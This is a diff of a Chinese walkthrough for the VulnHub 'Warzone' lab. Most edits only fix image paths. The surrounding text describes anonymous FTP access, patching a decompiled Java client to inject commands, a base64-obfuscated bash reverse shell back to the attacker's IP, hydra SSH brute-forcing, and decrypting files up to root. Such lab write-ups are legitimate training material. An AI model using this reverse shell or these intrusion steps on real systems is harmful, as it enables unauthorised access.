@@ -10,27 +10,27 @@
 
 使用`arp-scan -l`或`netdiscover -r 192.168.1.1/24`扫描
 
-![](D:\stu\vulnhub\warzone靶场\pic-3\1.jpg)
+![](./pic-3/1.jpg)
 
 # 信息收集
 
 ## 使用nmap扫描端口
 
-![](D:\stu\vulnhub\warzone靶场\pic-3\2.jpg)
+![](./pic-3/2.jpg)
 
 ## FTP信息探测
 
 使用匿名用户`anonymous`配合空密码登录测试，发现直接登录成功，并发现两个文件，下载到`kali`中，一会进行查看
 
-![](D:\stu\vulnhub\warzone靶场\pic-3\3.jpg)
+![](./pic-3/3.jpg)
 
 查看下载的两个文件，一段英文，以及一个`java`文件
 
-![](D:\stu\vulnhub\warzone靶场\pic-3\4.jpg)
+![](./pic-3/4.jpg)
 
 看不懂英文可以翻译，这里大概意思就是，算了，上图吧
 
-![](D:\stu\vulnhub\warzone靶场\pic-3\5.jpg)
+![](./pic-3/5.jpg)
 
 记住用户名`alienum@exogenesis`，以及对用户名进行`sha-256`加密可能是其密码的，这里的加密可以从网上，或者使用软件都一样，这是加密后的`2c80976c2de4119d358e757a305a8ae2fbb44484b83aeeb70e053ccbb7274dbd`
 
@@ -45,7 +45,7 @@ java -jar alienclient.jar
 
 运行后，出现一个程序，可以利用，不过这里输入上面的用户名和密码，没有任何反应
 
-![](D:\stu\vulnhub\warzone靶场\pic-3\6.jpg)
+![](./pic-3/6.jpg)
 
 # alienclient.jar包反编译
 
@@ -53,7 +53,7 @@ java -jar alienclient.jar
 
 使用`jd-gui`对`jar`包进行一个反编译查看，在其中一个类代码中，找到与4444端口连接的代码，不过这里代码中是可能为域名的字符，那么尝试修改`/etc/hosts`中的文件，绑定这个域名与其IP地址
 
-![](D:\stu\vulnhub\warzone靶场\pic-3\8.jpg)
+![](./pic-3/8.jpg)
 
 再次运行`jar`包
 
@@ -63,37 +63,37 @@ java -jar alienclient.jar
 
 这时候，发现已经有变化了，相当于进入了
 
-![](D:\stu\vulnhub\warzone靶场\pic-3\9.jpg)
+![](./pic-3/9.jpg)
 
 翻译英文
 
-![](D:\stu\vulnhub\warzone靶场\pic-3\10.jpg)
+![](./pic-3/10.jpg)
 
 但是点击`view`，也就是查看，发现提示一个弹窗，说是无权限
 
-![](D:\stu\vulnhub\warzone靶场\pic-3\11.jpg)
+![](./pic-3/11.jpg)
 
 点击`upload`上传，提示还未实施
 
-![](D:\stu\vulnhub\warzone靶场\pic-3\12.jpg)
+![](./pic-3/12.jpg)
 
 ## 分析代码
 
 根据报错，定位代码中的位置，发现一个判断条件，也就是这个`role`可以控制`view`是否可以访问，那么就需要反编译后进行修改其中的内容，把`role`修改为`astronaut`
 
-![](D:\stu\vulnhub\warzone靶场\pic-3\13.jpg)
+![](./pic-3/13.jpg)
 
 现在把反编译后的源文件，都保存下来，或者复制到对应的文件也是可以的
 
-![](D:\stu\vulnhub\warzone靶场\pic-3\14.jpg)
+![](./pic-3/14.jpg)
 
 我这里是保存为`zip`压缩文件
 
-![](D:\stu\vulnhub\warzone靶场\pic-3\15.jpg)
+![](./pic-3/15.jpg)
 
 然后创建文件夹`java`，把压缩包中的文件解压到这里
 
-![](D:\stu\vulnhub\warzone靶场\pic-3\16.jpg)
+![](./pic-3/16.jpg)
 
 我这里是因为没有下载`IDE`等工具，本地是有一个`eclipse`，不过，感觉暂时用不到，应为这里还是比较简单的，进入`alien`文件夹。
 
@@ -101,7 +101,7 @@ java -jar alienclient.jar
 
 首先还是先进行修改，然后再进行编译，这里修改`Starter.java`文件中的`role`的值，这里最好是在离其进行判断的代码越近越好
 
-![](D:\stu\vulnhub\warzone靶场\pic-3\17.jpg)
+![](./pic-3/17.jpg)
 
 然后进行编译，这里因为是多个`java`文件构成，所以可以采用以下命令
 
@@ -113,15 +113,15 @@ javac -d . $(find . -name "*.java")
 
 发现提示报错点，因为是布尔类型，那么尝试修改这个值为`0`
 
-![](D:\stu\vulnhub\warzone靶场\pic-3\18.jpg)
+![](./pic-3/18.jpg)
 
 修改值
 
-![](D:\stu\vulnhub\warzone靶场\pic-3\19.jpg)
+![](./pic-3/19.jpg)
 
 再次进行编译操作，这次成功
 
-![](D:\stu\vulnhub\warzone靶场\pic-3\20.jpg)
+![](./pic-3/20.jpg)
 
 那么这时候就可以使用命令，来生成`jar`包
 
@@ -135,7 +135,7 @@ Class-Path: .
 
 我这里命名为`mainfest.txt`，内容与上面一致，在`alien`编译后的文件夹中
 
-![](D:\stu\vulnhub\warzone靶场\pic-3\21.jpg)
+![](./pic-3/21.jpg)
 
 然后在当前路径下执行`jar`命令
 
@@ -149,7 +149,7 @@ jar cvfm test.jar mainfest.txt alien
 #alien 是编译后的文件所在的，文件夹的名称
 ```
 
-![](D:\stu\vulnhub\warzone靶场\pic-3\22.jpg)
+![](./pic-3/22.jpg)
 
 到此是已经成功生成`jar`包，使用命令执行
 
@@ -163,7 +163,7 @@ java -jar test.jar
 
 这里带过，了解就行，图片的话，放一下吧，还有一个进行
 
-![](D:\stu\vulnhub\warzone靶场\pic-3\22-1.jpg)
+![](./pic-3/22-1.jpg)
 
 
 
@@ -171,11 +171,11 @@ java -jar test.jar
 
 使用`alienum@exogenesis`登录成功后，点击`view`，发现可以看到一些内容，不过并没有任何有用的东西，那么还需要从代码下手，
 
-![](D:\stu\vulnhub\warzone靶场\pic-3\23.jpg)
+![](./pic-3/23.jpg)
 
 在搜索`view`时，发现一个函数中，是对这个查看`report.txt`进行的操作
 
-![](D:\stu\vulnhub\warzone靶场\pic-3\24.jpg)
+![](./pic-3/24.jpg)
 
 这里就需要修改后再编译，首先把原本的`alien`文件夹删除，也就是原本编译好的文件夹
 
@@ -187,7 +187,7 @@ rm -rf alien
 
 然后修改`Starter.java`文件，先修改为`whoami`进行测试，确定是否可执行
 
-![](D:\stu\vulnhub\warzone靶场\pic-3\25.jpg)
+![](./pic-3/25.jpg)
 
 然后再进行编译和生成`jar`操作，与上面步骤一致
 
@@ -206,7 +206,7 @@ java -jar test1.jar
 
 使用`alienum@exogenesis`登录成功后，这时候不管点击哪一个`txt`文件，都会弹出`whoami`的结果
 
-![](D:\stu\vulnhub\warzone靶场\pic-3\26.jpg)
+![](./pic-3/26.jpg)
 
 ## 再次修改代码进行反弹shell
 
@@ -222,7 +222,7 @@ bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwLjIvOTk5OSAwPiYx}|{base64,
 
 这里的命令是在前面的基础上进行修改，截个图吧，后面编译就不截图了
 
-![](D:\stu\vulnhub\warzone靶场\pic-3\27.jpg)
+![](./pic-3/27.jpg)
 
 然后进行编译等操作，大概过程如下面代码所呈现的
 
@@ -246,7 +246,7 @@ java -jar test2.jar
 
 然后使用`alienum@exogenesis`登录后点击`view`后，随便点击其中的一个`txt`文件，都会触发反弹
 
-![](D:\stu\vulnhub\warzone靶场\pic-3\28.jpg)
+![](./pic-3/28.jpg)
 
 # 反弹shell至exomorph用户
 
@@ -257,7 +257,7 @@ cat /etc/passwd | grep /bin/bash
 ls -al /home
 ```
 
-![](D:\stu\vulnhub\warzone靶场\pic-3\29.jpg)
+![](./pic-3/29.jpg)
 
 我这里因为某些原因，导致靶机损坏，所以重新装的靶机，这里开始，IP地址会有转变
 
@@ -265,11 +265,11 @@ ls -al /home
 
 在靶机内当前用户的主目录下，发现几个文件，因为是`jar`文件，说明可能还是需要进行反编译操作，反正需要查看代码，这里还有其他的几个文件，也是下载为好，毕竟有一个文件还进行了隐藏文件的备份，说明挺重要的
 
-![](D:\stu\vulnhub\warzone靶场\pic-3\31.jpg)
+![](./pic-3/31.jpg)
 
 下载到`kali`中
 
-![](D:\stu\vulnhub\warzone靶场\pic-3\32.jpg)
+![](./pic-3/32.jpg)
 
 ## 反编译wrz3encryptor.jar
 
@@ -277,17 +277,17 @@ ls -al /home
 
 查看反编译后的`Main`文件内容
 
-![](D:\stu\vulnhub\warzone靶场\pic-3\33.jpg)
+![](./pic-3/33.jpg)
 
 再查看其中的`Cryptor`，确定为AES加密
 
-![](D:\stu\vulnhub\warzone靶场\pic-3\34.jpg)
+![](./pic-3/34.jpg)
 
 这里就直接修改代码，毕竟这里涉及到文件打开之类的，在线网站解密，大部分都还没有直接上传文件的。
 
 与之前一样，保存所有源代码到指定位置后，进行解压，然后就可以查看修改了
 
-![](D:\stu\vulnhub\warzone靶场\pic-3\35.jpg)
+![](./pic-3/35.jpg)
 
 ## 根据加密方式，添加解密方法
 
@@ -346,11 +346,11 @@ public class Cryptor
 java Main.java
 ```
 
-![](D:\stu\vulnhub\warzone靶场\pic-3\36.jpg)
+![](./pic-3/36.jpg)
 
 去设置的输出文件路径，查看文件`aliens.txt`，发现类似于用户名与密码的格式
 
-![](D:\stu\vulnhub\warzone靶场\pic-3\37.jpg)
+![](./pic-3/37.jpg)
 
 把`strings`出的内容，复制到一个文件`ssh.txt`中，然后使用`hydra`进行`ssh`爆破
 
@@ -359,21 +359,21 @@ hydra -C ssh.txt 192.168.10.11 ssh
 #-C 参数就是用 user:pass 这种格式
 ```
 
-![](D:\stu\vulnhub\warzone靶场\pic-3\38.jpg)
+![](./pic-3/38.jpg)
 
 # ssh登录anunnaki用户
 
-![](D:\stu\vulnhub\warzone靶场\pic-3\39.jpg)
+![](./pic-3/39.jpg)
 
 查看当前用户下的文件，发现几个文件，首先查看第一个`flag`吧
 
-![](D:\stu\vulnhub\warzone靶场\pic-3\40.jpg)
+![](./pic-3/40.jpg)
 
 查看剩下的两个文件，其中`info.txt`中相当于提示，内容大概为
 
 '记得使用 “--batch” 选项，否则当你解密 GPG 文件时，密码短语相关选项将会被忽略。你是知道密码短语的'
 
-![](D:\stu\vulnhub\warzone靶场\pic-3\41.jpg)
+![](./pic-3/41.jpg)
 
 使用`scp`把文件下载到`kali`中
 
@@ -381,7 +381,7 @@ hydra -C ssh.txt 192.168.10.11 ssh
 scp anunnaki@192.168.10.11:~/secpasskeeper.jar.gpg ./
 ```
 
-![](D:\stu\vulnhub\warzone靶场\pic-3\42.jpg)
+![](./pic-3/42.jpg)
 
 ## gpg文件格式解密
 
@@ -392,19 +392,19 @@ gpg --batch --output secpasskeeper.jar --passphrase nak1nak1.. --decrypt secpass
 #这里注意，--decrypt最好是放置在最后
 ```
 
-![](D:\stu\vulnhub\warzone靶场\pic-3\43.jpg)
+![](./pic-3/43.jpg)
 
 ## 反编译jar文件，并分析代码
 
 使用`jd-gui`反编译文件，查看`Main`文件中的代码，发现亮点
 
-![](D:\stu\vulnhub\warzone靶场\pic-3\44.jpg)
+![](./pic-3/44.jpg)
 
 其他两个文件，查看都是一些加密的算法吧，不需要修改
 
 修改`Main`中的判断，`/*  */`表示注释
 
-![](D:\stu\vulnhub\warzone靶场\pic-3\45.jpg)
+![](./pic-3/45.jpg)
 
 然后无需编译，直接执行也是可以的
 
@@ -412,7 +412,7 @@ gpg --batch --output secpasskeeper.jar --passphrase nak1nak1.. --decrypt secpass
 java Main.java
 ```
 
-![](D:\stu\vulnhub\warzone靶场\pic-3\46.jpg)
+![](./pic-3/46.jpg)
 
 获取密码`ufo_phosXEN`
 
@@ -420,11 +420,11 @@ java Main.java
 
 直接进行`su`切换
 
-![](D:\stu\vulnhub\warzone靶场\pic-3\47.jpg)
+![](./pic-3/47.jpg)
 
 查看最终`boss`文件
 
-![](D:\stu\vulnhub\warzone靶场\pic-3\48.jpg)
+![](./pic-3/48.jpg)
 
 
 
